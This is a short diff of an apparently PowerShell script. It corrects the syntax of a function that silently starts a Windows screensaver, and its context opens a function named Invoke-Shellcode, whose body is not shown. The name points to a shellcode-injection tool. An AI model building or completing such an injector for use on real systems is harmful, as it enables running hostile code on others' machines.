@@ -1,5 +1,6 @@
-function scr{
-start %windir%/System32/Ribbons.scr /s
+function scr
+{
+start $env:WINDIR/System32/Ribbons.scr /s
 }
 function Invoke-Shellcode
 {
